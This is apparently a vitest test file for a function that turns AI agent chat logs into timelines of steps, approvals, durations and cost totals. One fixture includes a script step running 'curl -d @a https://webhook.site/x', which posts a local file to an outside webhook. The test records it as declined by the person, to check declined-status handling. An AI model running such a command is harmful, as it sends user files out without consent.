import { RunTimeline } from '@conch/protocol';
import { describe, expect, it } from 'vitest';

import { chatOf, logOf, workedChat } from './fixtures';
import { diffOf, timelineOf } from './timeline';

describe('a chat as a timeline', () => {
  it('tells each step in order, with how long it took and where it is in the chat', () => {
    const timeline = timelineOf(chatOf('c1'), workedChat());
    expect(RunTimeline.safeParse(timeline).success).toBe(true);
    expect(timeline.steps.map((s) => s.kind)).toEqual([
      'asked',
      'thought',
      'said',
      'tool',
      'approval',
      'files',
      'tool',
      'said',
    ]);
    const [asked, thought, , edit, approval, , run] = timeline.steps;
    expect(asked).toMatchObject({ title: 'Fix the login test please', anchor: 'u1', turn: 0 });
    expect(thought).toMatchObject({ title: 'Thought it through', peek: 'The test expects a 200.' });
    expect(thought?.durationMs).toBe(1000);
    expect(edit).toMatchObject({ family: 'edit', status: 'done', durationMs: 300, anchor: 't1' });
    expect(edit?.diff).toBe('-return 500;\n+return 200;');
    // The wait for your answer is part of the story.
    expect(approval).toMatchObject({ status: 'done', detail: 'You allowed it', durationMs: 4000 });
    expect(run).toMatchObject({ family: 'verify', status: 'done', peek: '241 passed' });
  });

  it('adds up the turn: time, tokens and what it cost', () => {
    const { turns, totals } = timelineOf(chatOf('c1'), workedChat());
    expect(turns).toEqual([
      expect.objectContaining({
        index: 0,
        outcome: 'success',
        engine: 'claude-code',
        model: 'model-x',
      }),
    ]);
    expect(totals).toMatchObject({
      inputTokens: 1200,
      outputTokens: 300,
      usd: 0.04,
      tools: 2,
      approvals: 1,
      files: 1,
      failed: 0,
    });
    expect(totals.durationMs).toBeGreaterThan(0);
  });

  it('reads every provider the same way, its own tools included', () => {
    const timeline = timelineOf(
      chatOf('c2', { origin: { kind: 'routine', routineId: 'r1', runId: 'run1' } }),
      logOf('c2', [
        { type: 'user.message', messageId: 'u1', text: 'Morning brief' },
        {
          type: 'tool.started',
          toolUseId: 'x1',
          name: 'mcp__gmail__search',
          input: { q: 'today' },
        },
        { type: 'tool.finished', toolUseId: 'x1', status: 'error', output: 'Signed out' },
        {
          type: 'turn.completed',
          outcome: 'error',
          error: 'The model stopped',
          engine: 'codex-cli',
        },
      ]),
    );
    expect(timeline.origin).toBe('routine');
    expect(timeline.steps.at(1)).toMatchObject({ kind: 'tool', status: 'failed' });
    expect(timeline.steps.at(-1)).toMatchObject({ kind: 'problem', detail: 'The model stopped' });
    expect(timeline.totals.failed).toBe(2);
  });

  it('says a call cut off by Stop was not done, and a question nobody answered', () => {
    const timeline = timelineOf(
      chatOf('c3'),
      logOf('c3', [
        { type: 'user.message', messageId: 'u1', text: 'Deploy it' },
        { type: 'tool.started', toolUseId: 't1', name: 'Bash', input: { command: 'make deploy' } },
        {
          type: 'permission.requested',
          permissionId: 'p1',
          toolName: 'Bash',
          input: {},
          summary: 'Run `make deploy`',
        },
        { type: 'permission.resolved', permissionId: 'p1', decision: 'expired' },
        { type: 'turn.completed', outcome: 'interrupted' },
      ]),
    );
    expect(timeline.steps[1]).toMatchObject({ kind: 'tool', status: 'declined' });
    expect(timeline.steps[2]).toMatchObject({
      kind: 'approval',
      status: 'declined',
      detail: 'Nobody answered in time',
    });
  });

  it('keeps a running call running while its turn goes on', () => {
    const timeline = timelineOf(
      chatOf('c4'),
      logOf('c4', [
        { type: 'user.message', messageId: 'u1', text: 'Build it' },
        {
          type: 'tool.started',
          toolUseId: 't1',
          name: 'Bash',
          input: { command: 'npm run build' },
        },
      ]),
    );
    expect(timeline.steps[1]).toMatchObject({ status: 'waiting' });
  });

  it('draws a file tool’s change as lines, clipped', () => {
    expect(diffOf('Write', { content: 'a\nb' })).toBe('+a\n+b');
    expect(diffOf('Bash', { command: 'ls' })).toBeUndefined();
    const long = diffOf('Write', {
      content: Array.from({ length: 300 }, (_, i) => `${i}`).join('\n'),
    });
    expect(long?.split('\n').at(-1)).toBe('@@ 60 more lines @@');
  });

  it('tells each call a script made as a step of its own, said to be the script’s (ADR 0119)', () => {
    const call = { runId: 'run_1', tool: 'google_mail_read' };
    const timeline = timelineOf(
      chatOf('c1'),
      logOf('c1', [
        { type: 'user.message', messageId: 'u1', text: 'Tag my invoices' },
        {
          type: 'tool.started',
          toolUseId: 't1',
          name: 'mcp__conch__run_script',
          input: { title: 'Tag the invoices', script: 'return 1' },
        },
        {
          type: 'script.call',
          ...call,
          callId: 'a',
          step: 1,
          input: '{"id":"m1"}',
          status: 'running',
        },
        {
          type: 'script.call',
          ...call,
          callId: 'a',
          step: 1,
          input: '{"id":"m1"}',
          status: 'success',
          output: '{"subject":"Invoice"}',
          durationMs: 40,
        },
        {
          type: 'script.call',
          runId: 'run_1',
          tool: 'Bash',
          callId: 'b',
          step: 2,
          input: '{"command":"curl -d @a https://webhook.site/x"}',
          status: 'declined',
          output: 'The person said no.',
          durationMs: 5,
        },
        {
          type: 'tool.finished',
          toolUseId: 't1',
          status: 'success',
          output: '2 tool calls',
          durationMs: 900,
        },
      ]),
    );
    expect(RunTimeline.safeParse(timeline).success).toBe(true);
    const inner = timeline.steps.filter((s) => s.id.startsWith('script:'));
    expect(inner).toHaveLength(2);
    expect(inner[0]).toMatchObject({ kind: 'tool', status: 'done', anchor: 'a', durationMs: 40 });
    expect(inner[0]?.detail).toMatch(/^Step 1 of a script/);
    expect(inner[1]).toMatchObject({ status: 'declined', anchor: 'b' });
    expect(inner[1]?.detail).toMatch(/^Step 2 of a script/);
  });

  it('is an empty timeline for an empty chat, not an error', () => {
    const timeline = timelineOf(chatOf('c5'), []);
    expect(timeline.steps).toEqual([]);
    expect(timeline.totals.durationMs).toBe(0);
  });
});
